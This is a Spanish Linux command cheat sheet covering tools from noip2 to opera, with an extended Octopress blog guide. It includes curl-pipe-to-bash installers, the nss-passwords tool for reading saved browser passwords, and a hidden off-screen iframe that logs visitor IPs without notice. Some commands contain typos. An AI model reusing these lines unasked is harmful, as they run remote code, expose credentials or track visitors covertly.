# noip2 -i 192.168.1.2 (Forzar a que noip2 actualice los dominios con la IP suministrada)
# noip2 -I eth1 (Forzar que noip2 se conecte a internet con la tarjeta de red especificada)
Nota.- En algunas distros, para iniciar el servicio al inicio:
# nano /etc/rc.local
Y colocar, según donde se encuentre el ejecutable, la linea:
/usr/local/bin/noip2 &


nologin
Muestra un mensaje de que una cuenta no está habilitada. Está destinado como un campo de shell de reemplazo para las cuentas que estan deshabilitadas.
# nano /etc/passwd
...
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
...


normalize
Ajustar volumen.
$ normalize-audio *.wav
$ normalize-mp3 *.mp3


normalizer
Informa de la codificación de origen utilizada en un archivo de texto. Normaliza el texto a Unicode.
$ normalizer text.txt
$ normalizer -n text.txt (normaliza el archivo de entrada. Si no se establece, el programa no escribe nada.)


notify
[libnotify-bin]. Aviso o notificación que lanza el sistema al producirse un evento o terminar una tarea.
$ notify-send "Linux es un sistema genial" -t 5000
Un ejemplo de uso para algunas tareas:
$ nano .bashrc
Añadir las siguientes dos lineas:
alias alert_helper='history|tail -n1|sed -e "s/^\s*[0-9]\+\s*//" -e "s/;\s*alert$//"'
alias alert='notify-send -i /usr/share/icons/gnome/32×32/apps/gnome-terminal.png "[$?] $(alert_helper)"'
Guardar y recargar bashrc:
$ source .bashrc
Otros ejemplos:
$ find /home/$USER -iname *.jpg; notify-send "El comando ha terminado su labor."
$ sleep 10; alert
$ find /home/$USER -iname *.jpg; notify-send -i gtk-dialog-warning -t 4000 "ATENCIÓN" "El comando find ha terminado..."
opciones:
-i especifica el icono a usar
-t tiempo en milisegundos que se mostrará la nota


notus-scanner
Detecta productos vulnerables en el entorno de sistema. El método de escaneo consiste en evaluar la información interna del sistema detectando incluso productos inactivos porque no necesita interactuar con cada uno de los productos.
# notus-scanner


npm
Gestor de paquetes para la plataforma JavaScript Node. Coloca los módulos en su lugar para que Node pueda encontrarlos y gestiona los conflictos de dependencias de forma inteligente. Más comúnmente, se utiliza para publicar, descubrir, instalar y desarrollar programas node. Los paquetes se pueden instalar de forma global o local. Cuando un paquete se instala globalmente, podemos hacer uso de la funcionalidad del paquete desde cualquier directorio de nuestro ordenador. Por otro lado, si instalamos un paquete localmente, sólo podemos hacer uso de él en el directorio donde fue instalado.
# npm i (instala todos los modulos necesarios)
# npm init --yes (inicializar un proyecto. Se crea el archivo package.json)
# npm up -g paquete1 paquete2 (actualiza a la última versión paquete1 y paquete2)
# npm i paquete -g (instalar un paquete de forma global)
# npm c onfig list (ver ubicación de los paquetes globales npm)
# npm list -g (listar los paquetes globales instalados)
# npm outdated -g  (ver qué paquetes deben actualizarse)
# npm run (lista de scripts disponibles)
# npm restart (reiniciar un proyecto)
# npm star (arrancar un proyecto)
# npm stop (parar proyecto)
# npm -g uninstall paquete (desinstalar un paquete global)


nproc
Muestra el número de procesadores o cores.
# nproc


nrg2iso
Convertir imagen nrg a iso
$ nrg2iso imagen.nrg imagen.iso


nrss
Lector de noticias rss. No acepta importación de archivos opml. La configuración en ~/.nrss/config. Un ejemplo:
$ nano .nrss/config
	default_rate "5"
	default_show "30"
	default_maxitems "50"
	# add feeds
	add "http://www.hackplayers.com/feeds/posts/default?alt=rss" "hackplayers"
	add "https://andalinux.wordpress.com/feed/" "informatico de guardia"
	add "https://ubuntulife.wordpress.com/feed/" "ubuntu life"
	# navegador
	browser "/usr/bin/firefox %u"
Teclas de uso:
	h (ver uso)
	C (contraer todos los feeds)
	Espacio (Contraer un feed o leer una historia)
	g (ir a la url con el navegador definido)
	x (Mostrar todas las noticias del feed)
	r (Actualiza el feed actual)
	R (Actualizar todos los feeds)
	M (Marcar todo como leído)
	q (salir)


nscd
Demonio que cada vez que se reinicia, elimina los datos de la caché DNS. Para mayor efectividad colocar en el cron.
# /etc/init.d/nscd restart


nsenter
Utilidad de Linux que permite ejecutar un comando en el espacio de nombres de un proceso en ejecución. Los espacios de nombres son una característica del kernel de Linux que proporciona entornos aislados para procesos y son utilizados por ejemplo, por Docker para crear contenedores aislados.
# nsenter --target 841052 --all ip a (Ejecutar el comando "ip" con el argumento "a" utilizando el mismo espacio de nombres que un proceso con pid 841052)
Podemos sustituir "--all" por: --net, --pid, --ipc
# nsenter --target pid --net command command_arguments (Ejecutar un comando en el espacio de nombres de red de un proceso existente)
# nsenter --target pid --pid command command_arguments (Ejecutar un comando en el espacio de nombres PID de un proceso existente)
# nsenter --target pid --ipc command command_arguments (Ejecutar un comando en el espacio de nombres IPC de un proceso existente)
# nsenter --target 841052 --uts --time --ipc -- ip a (Ejecutar el comando "ip" con el argumento "a "en los espacios de nombres UTS, time e IPC del proceso con pid 841052)
# nsenter --pid=/proc/325/pagemap -- ip a (Ejecutar "ip a" de nombres de un proceso existente haciendo referencia a procfs)


nslookup
saber si las DNS resuelven correctamente los nombres y las IP
$ nslookup ip_o_nombre_host
$ nslookup `curl ifconfig.me` (conocer la IP pública)
1.-
Conocer las DNS del equipo:
	$ nslookup (Darle enter y al entrar en el prompt colocar "server")
	> server
	Default server: 80.58.61.250
	Address: 80.58.61.250#53
	Default server: 80.58.61.254
	Address: 80.58.61.254#53


nss-passwords
Programa que lee las contraseñas en las claves utilizados por los productos de Mozilla, como Firefox y Thunderbird.
$ nss-passwords -d ~/pass -p pwdecrypt nombre (especificando el directorio del perfil. Por defecto el de Firefox, usando el programa pwdecrypt. Por defecto pinentry y "nombre" que se buscará en las entradas de claves)


nsswitch
El archivo de configuración del conmutador de servicio de nombres (NSS), /etc/nsswitch.conf, es utilizado por la biblioteca C de GNU y algunas otras aplicaciones para determinar las fuentes de las que se obtiene información sobre el servicio de nombres en una serie de categorías y en qué orden. Cada categoría de información se identifica mediante un nombre de base de datos. El archivo es texto ASCII simple, con columnas separadas por espacios o caracteres de tabulación. La primera columna especifica el nombre de la base de datos. Las columnas restantes describen el orden de las fuentes a consultar y un conjunto limitado de acciones que se pueden realizar según el resultado de la búsqueda. El archivo /etc/nsswitch.conf define el orden en el que el sistema comprueba los archivos /etc/hosts y /etc/resolv.conf. Este archivo también define el orden de búsqueda predeterminado para muchos otros servicios, como nombre de host, usuarios, grupos, contraseñas, etc.
# cat /etc/nsswitch.conf | grep hosts
Donde "files" representa el archivo /etc/hosts, "dns" indica el servidor DNS configurado en el archivo /etc/resolv.conf y "myhostname" es el valor predeterminado. Si las opciones "files" y "dns" no funcionan, Linux utiliza este valor como el nombre predeterminado para la máquina local.


nstat
Muestra las estadísticas de la red.
$ nstat
$ nstat -z (Mostrando los contadores a cero. Por defecto no se muestran)
$ nstat -a (Volcado absoluto de todos los contadores)
$ nstat -r (Resetear los contadores)


ntfs-3g
[fuse]. Driver que permite modificar archivos en sistemas ntfs. La partición puede ser montada:
# mount -t ntfs-3g /dev/hda3 /media/win
O en el /etc/fstab con la linea:
/dev/hda3  /media/win ntfs-3g defaults 0 0


ntfsclone
[ntfsprogs]. Permite la creación de particiones NTFS de Windows y su posterior restauración
# ntfsclone -s -o imagen.img /dev/sda1 (crea el fichero imagen.img de la partición /dev/sda1)
# ntfsclone -r -O /dev/sda1 imagen.img (Restaura la imagen en la partición que queramos)


ntfsfix
[ntfsprogs]. Reparación de inconsistencias en sistemas de archivos ntfs.
# ntfsfix /dev/sdb1
Finalizado el proceso, montarla:
# mount -t ntfs-3g /dev/sdb1 /media/win -o force


ntfslabel
[ntfsprogs]. Poner etiquetas a las particiones y dispositivos ntfs
# ntfslabel -f -v /dev/sda1 win


ntop
[graphviz gsfonts-x11]. Monitor de red via navegador. Ha sido reemplazado por ntopng.
# ntop --set-admin-password   (contraseña para el usuario "admin")
# gedit /var/lib/ntop/init.cfg (Comprobar interfaz de red. Por defecto eth0)
# /etc/init.d/ntop restart (reiniciar)
Visualizar los informes en el navegador <http://localhost:3000>


ntopng
Muestra el uso de la red.
# ntopng -i eth0
# ntopng -d  (especifica el directorio de datos. Por defecto /var/lib/ntopng)
# ntopng -i tcp://192.168.1.1:5556 (especificando protocolo, host y puerto)


ntpdate
Actualiza la hora del sistema via NTP (Network Time Protocol)
# ntpdate -u cl.pool.ntp.org


number
[bsd-games]. Muestra como se muestran los números en inglés.
$ number -l 55
$ number (Entra en el promt para ir entrando números. “q” [enter] para salir)


numdiff
Aplicación que se puede utilizar para comparar archivos supuestamente similares línea por línea y campo por campo, ignorando pequeñas diferencias numéricas o diferentes formatos numéricos. Es similar a diff[ver], pero tiene en cuenta los números de coma flotante, incluidos los números complejos y de precisión múltiple. Numdiff es útil para comparar archivos de texto que contienen campos numéricos, al probar o realizar controles de calidad en computación científica o en análisis numérico.
$ numdiff archivo archivo1


numfmt
Convertir números a formatos legibles por humanos.
$ numfmt --to=si 500000
$ numfmt --to=iec-i 500000
$ numfmt --from=si 1M
$ numfmt --from=auto 1Mi
$ numfmt --from=si --to=iec 1T
$ numfmt --from=auto --to=iec 1T


numlockx
Activar el bloqueo numerico al inicio:
$ numlockx on/off  (activarlo/desactivarlo)


num-utils
Conjunto de programas para manejar números desde la línea de comandos. Al igual que otras utilidades de línea de comandos, como grep, awk, sort, cut o etc estas utilidades funcionan con datos tanto de archivos estándar como de archivos. Inclye los siguientes ejecutables: numaverage [programa para calcular el promedio de números],  numbound [encuentra los números de límite mínimo y máximo de la entrada], numinterval [Muestra los intervalos numéricos entre cada número de una secuencia], numnormalize [Normaliza un conjunto de números entre 0 y 1 de forma predeterminada], numgrep [Como grep normal, pero para conjuntos de números], numprocess [Realiza operaciones matemáticas con números], numsum [Suma todos los números], numrandom [Genera un número aleatorio a partir de una expresión dada], numrange [Genera un conjunto de números en una expresión de rango] y numround [Redondea cada número según su valor]


nuspell
Corrector ortográfico diseñado para idiomas con morfología rica y composición de palabras compleja.
$ nuspell
  INFO: Locale LC_CTYPE=ca_ES.UTF-8, Input encoding=UTF-8, Output encoding=UTF-8
  INFO: Pointed dictionary /usr/share/hunspell/ca_ES.aff
  Enter some text:
$ nuspell file.txt


nuttcp
Herramienta de medición del rendimiento de la red cliente/servidor.
$ nuttcp IP (uso básico)
$ nuttcp -s IP (que la ip especificada sea el receptor)
$ nuettcp - IP (que la ip especificada sea el transmisor)


nvme-cli
Medir la temperatura del SSD entre otros parámetros.
# nvme smart-log /dev/nvme0 (uso básico)
# nvme smart-log /dev/nvme0 | grep 'temperature'


nvram-wakeup
Puede leer y escribir en la BIOS la hora de activación del encendido autormático del pc si este tiene soporte RTC [soporte Real-Time Clock]. A la hora de arrancar, la computadora se encenderá automáticamente desde el estado de apagado. La utilidad rtcwake [ver] es un reemplazo moderno de nvram-wakeup.
# nvram-wakeup -w 7 (Comenzar 7 minutos antes de la hora de arrancar [el valor predeterminado es 5, más que suficiente])


nvtop
Interfaz de monitoreo basada en ncurses que proporciona información sobre los estados de GPU, utilización de memoria, temperatura, etc e información sobre los procesos que se se estan ejecutan en las GPU.
$ nvtop


nwrite
Enviar mensajes entre terminales
$ nwrite usuario /dev/pts/numero_consola


nyancat
es un programa que muestra un gato poptart animado en la terminal.
$ nyancat -n -s -f 50 (sin contar el tiempo, sin titulo y parar a los 50 frames [5 segundos])


o3read
wget http://siag.nu/pub/o3read/o3read-0.0.4.tar.gz
Paquete que contiene herramientas [o3tohtml, o3totxt] para convertir archivos en formato openoffice o libreoffice a html o txt. Los ficheros de openoffice/libreoffice son formatos comprimidos. El que contiene el texto es el archivo “content.xml” que es el que se ha de descomprimir con unzip antes de tunelarlo a la aplicación.
$ unzip -p archivo.odt content.xml | o3totxt > archivo.txt
$ unzip -p archivo.sxw content.xml | o3tohtml > archivo.html


obconf
Herramienta para la configuración gráfica de entornos de escritorio ligeros (lxde, openbox...)


objcopy
$ objcopy -O binary test test.bin (convierte a codigo máquina RAW un fichero ejecutable compilado)


objdump
$ objdump -S --disassemble /bin/bash > bash.asm (Descompila en código assembler un programa compilado. En el ejemplo se ha usado /bin/bash)


oblogout
Lanzar cuadro de diálogo para reiniciar, cerrar, suspender... en escritorios ligeros.


obmenugen
Generador de menús para escritorios ligeros (openbox, fluxbox...)
$ obmenugen


oclock
Muestra la hora actual en una pantalla analógica.
$ oclock -fg red -bg yellow -minute green -geometry 150x150 (manecilla de las horas en rojo, fondo amarillo, la de los cuartos verde y geomatria 150x150)


octopress
[git-core curl zlib1g-dev libssl-dev build-essential libreadline-dev libaml]. CMS para gestión de contenido web que genera automaticamente los archivos html, css y javascript a partir de archivos de texto plano formateado en markdown (Ver) y sin utilizar base de datos.
Pasos previos para su instalación en Debian y derivados:
$ curl -L https://get.rvm.io | bash -s stable –ruby
$ source ~/.rvm/scripts/rvm
$ rvm install 1.9.3
$ rvm use 1.9.3
$ rvm rubygems latest
En Arch (requiere el paquete curl):
$ curl -L get.rvm.io | bash -s stable
$ source ~/.rvm/scripts/rvm
$ rvm requirements
$ rvm install 1.9.3
$ rvm use 1.9.3 –default
$ rvm rubygems current
Instalación de octopress:
$ git clone git://github.com/imathis/octopress.git octopress
$ cd octopress
$ gem install bundler
$ bundle install
$ rake install
Generar contenido (Ver markdown):
$ cd octopress
$ rake new_post[“nombre_del_nuevo_post”]
Crea un archivo en la carpeta /home/usuario/octopress/source/_posts/ con el siguiente encabezado:
	--
	layout: post
	title: “Nombre_del_post”
	date: 2012-10-17 19:27
	comments: true
	categories:
	--
Título del post [title], fecha [date], si permitimos o no comentarios [true/false] y catagorias [categories] entre corchetes y separadas por comas [comandos, redes]
A continuación de este encabezado introducimos la entrada del post. Al finalizar la entrada para generar el archivo en la carpeta “public”:
$ rake generate
Para visualizarlo en local [http://localhost:4000] lanzar:
$ rake preview
Y no cerrar la terminal. Para matar la previsualización pulsar Ctrl +c
La configuración del titulo del blog, subtítulo, autor, etc. Algunos parámetros a especificar:
$ nano _config.yml
	url: http://crontux.homelinux.com
	title: TRACTATUS ELEMENTALIS
	subtitle: Apuntes sobre Bash. GNU/Linux a tope.
	author: lapipaplena
	simple_search: http://google.com/search
	description: Orgasmos con Gnu/linux
	date_format: "%d-%m-%Y"
	search_text: "Buscar"
	paginate: 10
	pagination_dir: blog
	recent_posts: 10
	excerpt_link: "Leer m&aacute;s &rarr;"
	code_dir: downloads/scripts
	# Twitter
	twitter_user: templix
	twitter_tweet_count: 6
	twitter_show_replies: false
	twitter_follow_button: true
	twitter_show_follower_count: false
	twitter_tweet_button: true
	# Google Plus Profile
	# Hidden: No visible button, just add author information to search results
	googleplus_user: 107431970267257491799
	googleplus_hidden: false
Para la creación de nuevas páginas:
$ rake new_page[previa]
Si queremos que la nueva página salga en una pestaña "previa" en la cabecera:
$ nano source/_includes/custom/navigation.html
	<li><a href="/previa">Previa</a></li>
En este archivo tambien se pueden personalizar los nombres de las pestañas. Si queremos una pestaña con un enlace a una web:
$ nano source/_includes/custom/navigation.html
	<li><a href="http://www.lapipaplena.net">Web</a></li>
1.-
Crear un apartado "Sobre mi" en el sidebar con una imagen web en el centro de la linea:
$ nano source/_includes/custom/asides/about.html
Con el siguiente contenido:
	<section>
	  <h1>Sobre mi</h1>
	  <center>
	  <img src="https://lh5.googleusercontent.com/-WyGxndIWvo4/AAAAAAAAAAI/AAAAAAAACRI/L_iOIAgh69A/s250-c/photo.jpg" width="125" height="125">
	  </center>
	  <p>Cualquier texto explicativo</p>
	</section>
Luego añadir el achivo en:
$ nano _config.yml
en la linea:
	default_asides: [asides/num_entradas.html, asides/recent_posts.html, custom/asides/about.html]
2.-
Para mostrar archivo con código [script.sh, por ejemplo] se ha de colocar en texto plano en la ruta especificada en _config.yml, linea code_dir [downloads/scripts/ en este caso] y si lo queremos en la barra de navegación:
$ nano source/_includes/custom/navigation.html
Y añadir la linea:
	<li><a href="{{ root_url }}/scripts">Scripts</a></li>
Si lo colocamos en un post, llamarlo con:
	% include_code script.sh lang:bash script.sh %
Al principio de la linea antes del % colocar una llave abierta y al final despues del % la cerrada. Se han omitido porque Octopress lo interpreta.
Nota.- Despues de cualquier modificación en las entradas o en los archivos de configuración lanzar:
$ rake generate
3.-
Instalar un nuevo tema:
$ git clone git://github.com/tommy351/Octopress-Theme-Slash.git .themes/slash
$ rake install['slash']
$ rake generate
4.-
Para que las busquedas se realicen en el mismo site y no en la web:
$ nano _config.yml
Modificar la linea:
	simple_search: http://www.google.com/search?q=site%3Awww.lapipaplena.net&q=
5.-
Quitar la fecha del post en la url:
$ nano _config.yml
Y dejar la linea:
permalink: /blog/:title/
Con lo que si se borran entradas antiguas para substituirlas por otras nueva con el mismo nombre, la indexación de google no se pierde.
6.-
Colocar en el sidebar un blogroll
Crear el fichero:
$ nano source/_includes/asides/blog_roll.html
Con el siguiente contenido, adaptado según gustos:
	<section>
	  <h1>Blogs útiles</h1>
	  <ul>
		  <li><a href="http://distrowatch.com">distrowatch</a></li>
		  <li><a href="http://es.wikipedia.org/wiki/Lista_de_n%C3%BAmeros_de_puerto">Listado de puertos</a></li>
		  <li><a href="http://livecdlist.com/">LiveCDs</a></li>
	   </ul>
	</section>
Editar:
$nano _config.yml
Y añadir asides/blog_roll.html a la linea:
	default_asides: [asides/recent_posts.html, asides/twitter.html, asides/blog_roll.html]
7.-
Modificar el "Posted by" por "Escrito por"
$ nano source/_includes/post/author.html
Modificar la linea que empieza por "if author":
	<span class="byline author vcard">Escrito por <span class="fn">{{ author }}</span></span>
8.-
Mostrar datos del visitante de la web:
Crear:
$ nano octopress/source/_includes/asides/ip_visitante.html
Con el siguiente contenido:
	<section>
		    <h1>Datos visitante</h1>
		    <script type="text/javascript" src="http://boastology.com/tools/ip2c/?im=1&cn=1&ip=1"></script>
	</section>
Las opciones de la url, aunque no siempre funcionan correctamente, son:
	im=1 (1 mostrar bandera, 0 no mostrar)
	cn=1 (1 mostrar nombre país, 0 no mostrar)
	ip=1 (1 IP, 0 no mostrar)
$ nano _config.yml
Y añadir a la linea default_asides el archivo según el lugar que queremos que ocupe en el sidebar [en tercer lugar en este ejemplo]:
	default_asides: [asides/num_entradas.html, asides/recent_posts.html, asides/ip_visitante.html]
9.-
Para especificar una imagen en octopress, la sintaxis es:
	{% img center http://www.lapipaplena.net/wp-content/uploads/2011/06/lapipaplena.png La_Pipa_Plena %}
Con medidas determinadas y en la derecha:
	{% img right http://www.lapipaplena.net/wp-content/uploads/2011/06/lapipaplena.png 150 250 La_Pipa_Plena %}
10.-
Modificación de colores. Por ejemplo la barra de navegación:
$ nano sass/custom/_colors.scss
Buscar la variable $nav-bg, descomentarla (quitarle las dos //) y colocar el código de color escogido:
	//$subtitle-color: lighten($header-bg, 58);
	$nav-bg: desaturate(lighten(#C68800, 18), 5);
	//$nav-bg-front: image-url('noise.png');
11.-
Colocar una imagen en el header que previamente habremos copiado en el directorio source/images/:
$ nano sass/custom/_styles.scss
Y pegamos:
	header[role="banner"] {
     	background-image: url(/images/tux.png);
     	background-position:left;
     	background-repeat: no-repeat;
	}
12.-
Quitar la opción RSS de la barra de navegación:
$ nano source/_includes/navigation.html
Y borrarlo en la linea "site.subscribe_rss"
13.-
Centrar el título del blog:
$ nano source/_includes/custom/header.html
Y dejarlo:
	<hgroup>
	  <div align=center>
	  <h1><a href="{{ root_url }}/">{{ site.title }}</a></h1>
	  {% if site.subtitle %}
		<h2>{{ site.subtitle }}</h2>
	  </div>
	  {% endif %}
	</hgroup>
13.-
Resolver el error en el rake preview "WARN  TCPServer Error: Address already in use - bind(2)"
$ lsof -i4000 (Para conocer el pid del proceso)
$ kill -9 PID
14.-
Llevar un archivo de las visita al site:
Crear en la carpeta web el archivo:
nano /var/www/getip.php
Con el siguiente contenido:
	<?php
	$userip = $_SERVER['REMOTE_ADDR'];
	$file = fopen('ips_visitantes.txt', 'r');
	$filedata = fgets($file);
	fclose($file);
	$file = fopen('ips_visitantes.txt', 'a');
	fwrite($file, "\n$filedatan$userip");
	fclose($file);
	?>
Y luego en la carpeta octopress:
$ nano source/_includes/after_footer.html
Añadir al final:
	<div style="width: 1px; height: 1px; overflow: hidden; position: absolute; left: -1000px">
	<iframe src="http://crontux.homelinux.com/getip.php"></iframe>
	</div>
15.-
Para que las url se abran en una nueva pestaña.
$ nano source/javascripts/links.js
Y pegamos:
	$(document).ready(function(){
	    $('a').each(function() {
	        var a = new RegExp('/' + window.location.host + '/');
	        if(!a.test(this.href)) {
	            $(this).click(function(event) {
	                event.preventDefault();
	                event.stopPropagation();
	                window.open(this.href, '_blank');
	            });
	        }
	    });
	});
$ nano source/_includes/head.html
Añadir la linea:
	<script src="(( root_url ))/javascripts/links.js"></script>
Nota.- Los 4 parentesis que abren y cierran el código "root_url" han de substituirse por llaves "{{"  "}}".
16.-
Añadir en el sidebar las sección "Entradas más populares" [Popular posts]
$ cd octopress
$ nano Gemfile
Y añadir al final la linea:
gem 'octopress-popular-posts'
$ bundle install
$ bundle exec octopress-popular-posts install
$ nano _config.yml
Añadir al final la linea [5 es el número de posts que saldrán]:
popular_posts_count: 5
Y en la linea "default_asides:" añadimos en el lugar que deseemos:
default_asides: [....ent_posts.html, custom/asides/popular_posts.html,custom/asid...]
$ nano .gitignore
Aadir la linea:
.page_ranks
$ nano source/_includes_custom/asides/popular_posts.html
Y substituir "Popular posts" por "Entradas más vistas"
Para mantener actualizado el plugin lanzar de vez en cuando:
$ bundle exec octopress-popular-posts install
17.-
Subir el blog a heroku.
Crear una cuenta en <http://www.heroku.com>
	$ gem install heroku (Instalar la gema)
	$ cd octopress (Entrar en el directorio)
	$ heroku create (Pedirá las credenciales de la cuenta)
	$ git config branch.master.remote heroku (Implementar el control remoto via git)
	$ rake generate (Regenerar el site)
	$ git add . (Añadir el proyecto)
	$ git commit -m 'site updated' (Commit de los cambios)
	$ git push heroku master (Subir el sitio local a heroku)
Una vez subido por primera vez el sitio, las siguientes modificaciones se reflejarán con:
	$ rake generate
	$ git commit -a -m "pequeño_comentario_de_los_cambios"
	$ git push heroku master (En algunas ocasiones es suficiente con "git push")


od
Vuelca ficheros en octal
$ od -x fichero
$ cat texto.txt | od -x texto.octal


odt2txt
Pasar archivos .odt a texto plano.
$ odt2txt archivo.odt –output=archivo.txt
$ odt2txt archivo.odt | grep palabra (Buscar una palabra en un odt. Muestra el resultado en pantalla)


ofris-en
Programa que congela los cambios realizados en el sistema. Tanto la modificación de los archivos como las configuraciones desaparecerán al reiniciar el equipo. Una vez aplicada la función de "congelar" es posible realizar cambios en la máquina y probar software potencialmente peligroso, ya que al reiniciar el sistema todo volverá a estar como estaba antes de "congelarlo". Arrancar la aplicación con:
# ofris-en
Y mostrarà un menú de opciones:
	1. Congelar un usuario
	2. Congelar un usuario que se especifica
	3. Congelar todos los usuarios
	4. Descongelar todos los usuarios
	5. Ver el estado actual de la aplicación
	6. Salir


ogg123
[vorbis-tools]. Reproductor de música para archivos .ogg
$ ogg123 archivo.ogg (forma básica)
$ ogg123 ~/Música/* (reproducirá todos los .ogg de la carpeta mencionada)


oh-my-posh
Temas varios para el prompt.
$ curl -s https://ohmyposh.dev/install.sh | bash -s (descarga e instalación))
$ oh-my-posh get shell (muestra la shell que se esta usando)
$ oh-my-posh font install (muestra listado para escoger cual)
Descarga e instalación de temas:
$ wget https://github.com/JanDeDobbeleer/oh-my-posh/releases/latest/download/themes.zip -O ~/.poshthemes/themes.zip
$ unzip ~/.poshthemes/themes.zip -d ~/.poshthemes (descomprimir el .zip)
$ chmod u+rw ~/.poshthemes/*.json (permisos para los temas)
Una muestra se puede visualizar en https://ohmyposh.dev/docs/themes y una vez escogido el tema [en el ejemplo el tema "dracula"] añadir a .bashrc la linea:
eval "$(oh-my-posh --init --shell bash --config ~/.poshthemes/dracula.omp.json)"
$ $ oh-my-posh upgrade (que el nuevo prompt tenga efecto)


olive
Lector rss
$ olive archivo.opml (importar las fuentes)


omv-initsystem
Inicializa openmediavault en esta distribución de GNU/Linux basada en Debian. Es necesaria su ejecución para un correcto funcionamiento
# omv-initsystem


omv-sysinfo
En la distribución OpenMediaVault basada en Debian GNU/Linux muestra la información del sistema en formato json
# omv-sysinfo


on_ac_power
[powermgmt-base]. Determina si el sistema funciona con batería o con red electrica.
$ on_ac_power


oneko
Un gato persigue el cursor por la pantalla mientras trabajas. Alternativamente, un perro persigue un hueso. Hay opciones de menú para iniciar y detener el programa fácilmente en los modos perro y gato. Otras variaciones y configuraciones detalladas están disponibles a través de opciones de línea de comando.
$ oneko -dog -fg yellow -speed 20 (un perro, amarillo y a 20 de velocidad, por defecto 16)
$ oneko -neko (un gato. Otras alternativas: -sakura y -tomoyo)


only
Herramienta que permite buscar según patrones de palabras o patrones de líneas.
$ only -l palabra text.txt (muestra la linea donde sale "palabra")
$ only -w /palabra/0:5 text.txt (muestra "palabra" y las siguientes 5 palabras)
$ only -w 2/palabra/0:4 text.txt (muestra la 2ª vez que salie "palabra" y las siguientes 4 palabras)
$ only -l 3/palabra text.txt (muestra la 3ª linea donde sale "palabra")
$ only -l 3/palabra/0:2 text.txt (muestra la 3ª vez que sale "palabra" y las siguientes 2 lineas)


oowrite
Procesador de textos de la suite ofimática openoffice.
$ oowriter -pt pdf archivo.doc


open
[xdg-open] Abrir archivos o URLs con la aplicación predeterminada.
$ open http://google.com (abre con el navegador predeterminado)
$ open archivo.txt (con el editor predeterminado)


openbox
Gestor de ventanas
$ openbox –-replace (Activa openbox)
$ openbox --restart (Reinicia)
$ openbox --reconfigure (Relee los archivos de configuración después de una modificación)
Los archivos de configuración se encuentran en el directorio: .config/openbox:
- autostart
Donde se colocan las aplicaciones que arrancan cuando se inicia el sistema. La sintaxis es:
	(sleep 1 && nitrogen --restore) &
	(sleep 2 && lxpanel) &
	(slepp 3 && liferea) &
	(sleep 3 && volumeicon) &
	(sleep 3 && idesk) &
Retrasar [sleep] algunos segundos [1, 2, 3 ] el lanzamiento de las aplicaciones  y dejar los procesos en background [&]
- rc.xml
Archivo de configuración de los atajos de teclado y ratón. Cada atajo ha de colocarse en el interior de la etiqueta a la que correspondan: atajos de teclado entre <keyboard> y </keyboard>, los de ratón entre <mouse> y </mouse>...
Ejemplo para abrir firefox pulsando la tecla Win + f:
	<keybind key="W-f">
	   <action name="execute">
	   <execute>firefox</execute>
	   </action>
	</keybind>
Ejemplo para mostrar el menú del botón derecho del ratón pulsando las teclas Ctrl + Alt + m:
	<keybind key="C-A-m">
	   <action name="ShowMenu">
	   <menu>root-menu</menu>
	   </action>
	</keybind>
- menu.xml
El menú que se muestra con el botón derecho del mouse.
1.-
Cuando no se montan automaticamente los dispositivos usb que se conectan:
Añadir una o varias lineas a /etc/fstab con el siguiente contenido:
/dev/sdc1 /media/pen1 auto  rw,users,noauto 0 0
Modificando el nombre del dispositivo [ sdc2, sdc3...) en el gestor de archivos [thunar...] aparecera el icono y con doble clic se montará el dispositivo.


openclipart-svg
Colección de imágenes 100% libres de derechos de autor que pueden usarse sin ningún tipo de restricción. Han de visualizarse en el navegador y se encuentran en el directorio /usr/share/openclipart/svg/*. Estan ordenadas por temáticas: animals, buildings, computer, containers, decorations... y en subcarpetas. Si se instalan los paquetes openclipart-png y openclipart-libreoffice las imágenes tambien se tendran en formato png y podran incrustarse en documentos de libre office.
$ firefox /usr/share/openclipart/svg/electronics/battery/battery_snuatautisticido_04.svg
$ firefox /usr/share/openclipart/png/animals/birds/acquila_architetto_franc_01.png


opendoas
[doas] Versión  del comando doas de OpenBSD que es un reemplazo mínimo de sudo. Ejemplos de archivo de configuración /usr/share/doc/opendoas/examples/doas.conf y el archivo real de configuración [si no existe se crea]:
# nano /etc/doas.conf
Colocar el contenido que deseemos: al usuario de forma persistente y cmd nombre_del_comando:
permit persist usuario
permit nopass usuario as root cmd apt
$ doas apt update (despues de reiniciar las comandos apt como usuario sin sudo)
$ doas -C /etc/doas.conf (comprobar errores en el archivo de configuración)


openoffice
Suite ofimática
$ soffice --writer (--calc, --impress, --draw, --math, --base) Arrancar el programa
# spadmin  (Administración de impresoras)
Ajustes
1.-
Para que las presentaciones no se abran automaticamente:
Descargar (ImpressRunner.oxt):
Abrir Impress y en herramientas -> administrador de extensiones -> agregar
Buscar el archivo descargado. Reiniciar la aplicación. Cuando inicie la presentación, clicar esc y cancelar.
2.-
Para previsualizar en miniaturas los documentos:
# apt-get install ooo-thumbnailer


openssl
Codificador/descodificador
$ openssl aes-128-cbc -salt -in texto -out encriptado.aes128  (encriptar)
$ openssl aes-256-cbc -d -salt -in encriptado.txt -out desencriptado.txt  (desencriptar)
$ cat texto.txt | gzip | openssl des3 -salt -k clave > texto.txt.des3
$ openssl list-cipher-commands  (listar todas las opciones de encriptado)
$ openssl enc -des3 -in archivo.tar.bz2 -out cifrado.tar.bz2.ssl  (cifrar paquetes)
$ openssl enc -d -des3 -in cifrado.tar.bz2.ssl -out archivo.tar.bz2
$ openssl rand -base64 6  (generar una contraseña)
$ openssl enc -base64 -in imagen.jpg (Codificar una imagen)
Para visualizar el resultado del encriptado:
	$ hexdump -C ejemplo.aes128
Nota.- la opción "a" indica que codificará con base64. "-salt" Añade potencia al cifrado.


openvpn
Encapsular datos entre dos redes físicas usando una red privada virtual. Existen varios sitios de internet que ofrecen este servicio de forma gratuita. Aquí usaremos a modo de ejemplo frootvpn. Nos registramos en <https://www.frootvpn.com/> y descargamos el software:
$ wget https://www.frootvpn.com/files/frootvpn.ovpn
# mv frootvpn /etc/openvpn/
# openvpn /etc/openvpn/frootvpn.ovpn (Arrancar el servicio)
Opcionalmente pueden cambiarse las DNSs:
# nano /etc/resolv.conf
Y colocar:
Nameserver 80.67.0.2


openvt
lanza un programa en una nueva consola virtual [ttyX]. Ver deallocvt
# openvt -c 9 ifconfig (Lanzar ifconfig en la /dev/tty9)


opera
Navegador
1.-
Para que google no detecte al navegador y poder usar g+
En la barra de direcciones poner:
	opera:config#ISP|Id
Y en el espacio en blanco poner:
	AppleWebKit/535.1
Guardar y reiniciar.
2.-
